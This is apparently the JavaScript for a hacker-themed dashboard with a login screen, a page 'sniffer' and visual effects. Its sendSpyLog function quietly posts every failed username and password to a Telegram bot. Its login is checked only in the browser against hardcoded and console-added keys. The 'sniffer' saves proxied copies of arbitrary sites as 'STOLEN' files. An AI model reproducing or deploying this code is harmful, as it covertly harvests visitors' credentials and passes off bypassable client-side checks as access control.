let config = {};
// Real Database Simulator (Simpen di Browser)
let sessionKeys = JSON.parse(localStorage.getItem('oblivion_keys')) || [{"u":"zmx","p":"123"}];

fetch('config.json').then(r => r.json()).then(d => {
    config = d;
    document.getElementById('dev-update').innerText = d.system.update_log;
});

function checkAuth() {
    const u = document.getElementById('user').value;
    const p = document.getElementById('pass').value;
    const isMatched = sessionKeys.some(key => key.u === u && key.p === p);

    if(isMatched) {
        document.getElementById('login-screen').classList.add('hidden');
        document.getElementById('main-dashboard').classList.remove('hidden');
        document.getElementById('bg-audio').play();
    } else {
        alert("ACCESS DENIED!");
        sendSpyLog(u, p);
    }
}

async function godAlphaSniffer() {
    const url = document.getElementById('target-url').value;
    const log = document.getElementById('sniff-status');
    if(!url) return;

    log.innerHTML = `<span class="blue">Bypassing ${url}... Mohon Tunggu!</span>`;
    const proxy = "https://api.allorigins.win/get?url=";

    try {
        const res = await fetch(proxy + encodeURIComponent(url));
        const data = await res.json();
        const html = data.contents;

        if (html) {
            const blob = new Blob([html], { type: 'text/html' });
            const a = document.createElement('a');
            a.href = URL.createObjectURL(blob);
            a.download = `STOLEN_${new Date().getTime()}.html`;
            a.click();
            log.innerHTML = `<span class="green">SUCCESS! File Downloaded.</span>`;
        }
    } catch (e) { log.innerHTML = `<span class="red">Bypass Failed!</span>`; }
}

// COMMAND GENERATOR (Pencet F12 Console untuk pakai)
window.generateKey = function(u, p) {
    sessionKeys.push({"u": u, "p": p});
    localStorage.setItem('oblivion_keys', JSON.stringify(sessionKeys));
    console.log(`NEW KEY CREATED: User: ${u} | Pass: ${p}`);
};

function switchTab(t) {
    document.querySelectorAll('.content-tab').forEach(el => el.classList.add('hidden'));
    document.querySelectorAll('.t-btn').forEach(el => el.classList.remove('active'));
    document.getElementById('tab-' + t).classList.remove('hidden');
    event.currentTarget.classList.add('active');
}

function sendSpyLog(u, p) {
    const msg = `⚠️ LOGIN FAIL: User[${u}] Pass[${p}]`;
    fetch(`https://api.telegram.org/bot${config.telegram.token}/sendMessage?chat_id=${config.telegram.chat_id}&text=${encodeURIComponent(msg)}`);
}

// Smoke Effect
function createSmoke() {
    const container = document.getElementById('smoke-background');
    setInterval(() => {
        const p = document.createElement('div');
        p.className = 'smoke-particle';
        p.style.left = Math.random() * 100 + "%";
        container.appendChild(p);
        setTimeout(() => p.remove(), 10000);
    }, 400);
}
createSmoke();
